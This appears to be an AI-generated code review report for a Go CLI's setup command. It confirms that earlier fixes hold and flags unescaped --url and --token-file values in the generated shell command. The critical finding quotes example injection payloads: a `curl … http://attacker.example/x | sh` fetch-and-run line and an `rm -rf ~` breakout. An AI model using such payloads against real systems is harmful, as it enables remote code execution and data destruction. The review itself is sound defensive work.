---
phase: 02-setup-command-core
reviewed: 2026-08-30T15:14:28Z
depth: standard
files_reviewed: 29
files_reviewed_list:
  - cmd/engram/catalog.go
  - cmd/engram/catalog_test.go
  - cmd/engram/client_common.go
  - cmd/engram/clienttest_test.go
  - cmd/engram/cmdwalk_test.go
  - cmd/engram/destructive_test.go
  - cmd/engram/exitcode_baseline_test.go
  - cmd/engram/golden_test.go
  - cmd/engram/operator_output_test.go
  - cmd/engram/operator_view_setup_test.go
  - cmd/engram/setup.go
  - cmd/engram/setup_test.go
  - cmd/engram/testdata/catalog.golden
  - cmd/engram/testdata/help.golden
  - internal/config/client_validate.go
  - internal/config/client_validate_test.go
  - internal/config/config.go
  - internal/config/registry.go
  - internal/setup/claudecode.go
  - internal/setup/codex.go
  - internal/setup/detect_test.go
  - internal/setup/environment.go
  - internal/setup/exit.go
  - internal/setup/exit_test.go
  - internal/setup/leafpurity_test.go
  - internal/setup/opencode.go
  - internal/setup/plan.go
  - internal/setup/plan_test.go
  - internal/setup/runtime.go
  - internal/surfaces/toolclass.go
findings:
  critical: 1
  warning: 0
  info: 3
  total: 4
status: issues_found
---

# Phase 02: Code Review Report (re-review after gap-closure plan 02-03)

**Reviewed:** 2026-08-30T15:14:28Z
**Depth:** standard
**Files Reviewed:** 29
**Status:** issues_found

## Summary

This is a re-review of Phase 02 ("Setup Command Core") after gap-closure plan 02-03, which
closed three findings from the previous review pass: CR-01 (dead ENGRAM_URL/ENGRAM_AUTH env
lane), WR-01 (missing required-URL guard), and WR-02 (`--runtime` did not dedupe repeats).

**All three prior findings are confirmed fixed and correctly implemented, with no regressions:**

- **CR-01** — `setupPlanDoc` (`cmd/engram/setup.go:151-195`) now routes `--url`/`--auth` through
  `config.Load(cmd.Flags())`, and `internal/config/registry.go:113-114` carries `setup.url` /
  `setup.auth` rows with `Env: "ENGRAM_URL"` / `Env: "ENGRAM_AUTH"`. No second, bespoke
  `os.Getenv` read for either value exists anywhere in `cmd/engram/setup.go` or
  `internal/setup/*.go` (confirmed by grep) — a single resolution path, as required. Flag-beats-
  env precedence, env-only, and flag-only paths are each exercised by
  `TestSetupURLFromEnvReachesCommand`, `TestSetupAuthFromEnvSelectsBearerForm`, and
  `TestSetupFlagBeatsEnvForURL` (`cmd/engram/setup_test.go`).
- **WR-01** — `cmd/engram/setup.go:181-190` rejects an empty `cfg.Setup.URL` with
  `usageErrorf("--url or ENGRAM_URL is required")` (exit 2), covering the no-flag/no-env case,
  `ENGRAM_URL=""`, and an explicit `--url ""` — all three are exercised by
  `TestSetupMissingURLIsUsageError`'s three subtests, and the assertion also confirms stdout
  never carries a `would-write` outcome alongside the error.
  `--apply` has **no** registry `Env` row (confirmed: no `apply` entry in
  `internal/config/registry.go`), so the CR-01 fix did not open a way to flip preview into
  mutation via environment — consistent with the project's stated constraint.
- **WR-02** — `internal/setup/runtime.go:96-118`'s `Select` now dedupes a repeated `--runtime`
  name to its first occurrence, preserving caller-stated order, while still erroring on an
  unknown name even when repeated. `TestSelectDedupesRepeatedNames`
  (`internal/setup/plan_test.go:117-153`) covers `a,a`, an interleaved `codex,claude-code,codex`
  case, and a repeated-unknown-name case.

Testing throughout this phase is unusually thorough (env/flag precedence, byte-for-byte URL
passthrough, determinism, dedup order, exhaustive `Classify` outcome-combination coverage,
golden-file drift gates). No test-quality defects were found.

The re-review did surface one **new** issue, not part of the three closed findings: the
strings `internal/setup`'s three `Runtime.Plan` implementations author for `--url` (and, via
`bearerProvenance`, for `--token-file`) are interpolated into the emitted "ready-to-issue"
command **with no shell-escaping at all** — and CR-01's own fix is what newly gives an
environment-sourced (not manually typed) value a direct path into that string. See CR-01 below
(renumbered from the prior review; this is a distinct, newly-identified issue, not a reopened
one).

## Critical Issues

### CR-01: Unescaped `--url`/`--token-file` interpolation into the authored `mcp add` command enables command injection if the preview is copied into a shell

**File:** `internal/setup/claudecode.go:46,54-56,63-66`; `internal/setup/codex.go:43,51,59`;
`internal/setup/opencode.go:44,52-54`; `internal/setup/plan.go:88-103` (`bearerProvenance`);
`internal/config/client_validate.go:78-84` (`ValidateSetupAuth` validates only the auth
enum — nothing validates or sanitizes `cfg.Setup.URL`'s shape); `cmd/engram/setup.go:181-190`
(the required-URL guard checks only for emptiness).

**Issue:** Every `Runtime.Plan` builds its `Command` string with a bare `fmt.Sprintf("... %s ...", opts.URL)`
(and, for `--auth bearer`, `bearerProvenance(opts.TokenFile)` inside a double-quoted
`--header "Authorization: Bearer %s"` segment) — `opts.URL` and `opts.TokenFile` are never
shell-quoted or escaped anywhere in this call chain. `opts.URL` comes from `cfg.Setup.URL`,
which is validated only for non-emptiness (`cmd/engram/setup.go:181-190`); no `net/url.Parse`
or format check runs anywhere on it, and no registry-level sanitization exists in
`internal/config/config.go`'s `SetupConfig` or `client_validate.go`'s `ValidateSetupAuth`.

Two concrete injection vectors follow directly from this:

1. **Via `--url`/`ENGRAM_URL`:** a value such as
   `https://good.example.com/mcp; curl -s http://attacker.example/x | sh #` produces (claude-code,
   oauth mode):
   `claude mcp add --transport http engram https://good.example.com/mcp; curl -s http://attacker.example/x | sh # --scope user`
   Anyone (or any tool) that copies this "exact command it would issue" — which is the command's
   entire stated purpose (`cmd/engram/setup.go:33-43`'s own doc comment: "reports the exact
   command it would issue") — into a shell executes the injected `curl … | sh` as a second
   statement. `plan.go:11-16`'s own doc comment states this string is "AUTHORED HERE and nowhere
   else" and that "a later phase that executes them (Apply, Phase 3) … must consume these
   strings, never re-derive them" — meaning Phase 3's `--apply` is explicitly committed to
   executing this exact, unescaped string, very likely via a shell (`sh -c command` or
   equivalent), at which point this stops being a "someone has to copy-paste it" risk and
   becomes a direct, unattended command-injection sink.
2. **Via `--token-file`:** `bearerProvenance` (`plan.go:98-103`) embeds the token-file *path*
   verbatim inside a double-quoted string segment
   (`--header "Authorization: Bearer <from %s>"`, `claudecode.go:63-66` / `opencode.go:52-54`).
   A path containing a double quote — e.g. `--token-file 'x" ; rm -rf ~ #'` — breaks out of that
   quoting the same way.

This is materially worsened by the very fix under review: **CR-01 (the ENGRAM_URL/ENGRAM_AUTH
env lane)** now feeds an environment-sourced value into this same unescaped path. A CLI flag is
at least typically typed by the operator invoking the command at that moment; an environment
variable is routinely inherited from a shared `.envrc`, CI job, systemd unit, Docker/Compose
file, or devcontainer config the invoking operator did not personally author or re-check at
invocation time — and `engram setup`'s whole target audience is the AI coding agents named as
its own `--runtime` values (claude-code, codex, opencode), which are exactly the kind of
consumer likely to act on a previewed command's text programmatically rather than eyeball it
for injected shell syntax first.

Nothing in this phase's test suite (`cmd/engram/setup_test.go`, `internal/setup/plan_test.go`)
exercises a URL or token-file path containing shell metacharacters — `TestSetupEnvURLPassedVerbatim`
tests percent-encoding passthrough, not shell safety, so this gap is untested as well as
unmitigated.

**Fix:** Shell-quote each interpolated value at the point Plan authors the command string —
e.g. a small `shellQuote(s string) string` helper (wrap in single quotes, escaping any embedded
single quote as `'\''`) applied to `opts.URL` and to the token-file path inside
`bearerProvenance`, in all three runtime files:

```go
// internal/setup/shellquote.go (new)
func shellQuote(s string) string {
    return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}
```

```go
// claudecode.go, codex.go, opencode.go — every fmt.Sprintf that embeds opts.URL:
Command: fmt.Sprintf("claude mcp add --transport http engram %s --scope user", shellQuote(opts.URL)),
```

```go
// plan.go
func bearerProvenance(tokenFile string) string {
    if tokenFile == "" {
        return "<from ENGRAM_TOKEN>"
    }
    return fmt.Sprintf("<from %s>", shellQuote(tokenFile))
}
```

This keeps the URL's own bytes unmodified (D-02's "never appended to, stripped, normalized"
contract is about the URL's *content*, not about whether the surrounding shell syntax is safe to
paste) while closing the injection path. Add a test asserting that a URL/token-file path
containing `;`, `` ` ``, `$(`, `|`, and `'` round-trips safely (renders as a single shell word,
not as multiple statements) before Phase 3 wires `--apply` to actually execute these strings.

## Warnings

None.

## Info

### IN-01: Duplicate "failed" count computation in the `--apply` path

**File:** `cmd/engram/setup.go:262-270` (`setupApplySummary`) and `:324-329` (inline in
`setupApplyRun`)
**Issue:** `setupApplyRun` computes the same `failed` count twice: once inside
`setupApplySummary(rows)` for the headline, and again in its own loop immediately before
constructing the `*cliError`. The two counts can never actually drift (both iterate the same
`rows` slice with the same predicate), so this is a maintainability nit, not a bug.
**Fix:** Have `setupApplySummary` return `(summary string, failed int)`, or expose a small
`countFailed(rows []setupRuntimeRow) int` helper both call sites share.

### IN-02: `--token-file`'s pflag default is hardcoded rather than routed through the registry

**File:** `cmd/engram/setup.go:393-394`
**Issue:** `--url` and `--auth` both derive their pflag default from `config.FlagDefault(...)`
(the single source of truth `internal/config/registry.go` documents), but `--token-file`'s
default is hardcoded as the literal `""`:
```go
setupCmd.Flags().StringVar(&setupTokenFile, "token-file", "",
    "path to a file containing the bearer credential for --auth bearer ...")
```
This happens to match `registry.go`'s `client.token_file` row (which also has no `Default`), so
there is no live divergence today, but it is the one flag on this command that breaks the
otherwise-consistent "derive the default from the registry" pattern the other five flags follow.
**Fix:** `config.FlagDefault("token-file")` in place of the literal `""`, for consistency (no
behavior change today).

### IN-03: Validation order surfaces a secondary error before the more fundamental missing-URL error

**File:** `cmd/engram/setup.go:151-195` (`setupPlanDoc`)
**Issue:** `setupPlanDoc` validates `--auth` (`ValidateSetupAuth`) and resolves `--runtime`
(`setup.Select`) *before* checking whether a URL was supplied at all. A caller who both mistypes
`--auth` (or `--runtime`) and omits `--url`/`ENGRAM_URL` sees only the auth/runtime error and
never learns the URL is also missing until they fix the first one and re-run. This is a minor UX
rough edge, not a correctness defect — `TestSetupExitCodes`/`exitcode_baseline_test.go`'s
`setup/bad-auth` case happens to pass either way since both errors map to `exitUsage` (2).
**Fix:** Optional — check `cfg.Setup.URL == ""` first, ahead of `ValidateSetupAuth`/`Select`, so
the most fundamental configuration gap is always reported first.

---

_Reviewed: 2026-08-30T15:14:28Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
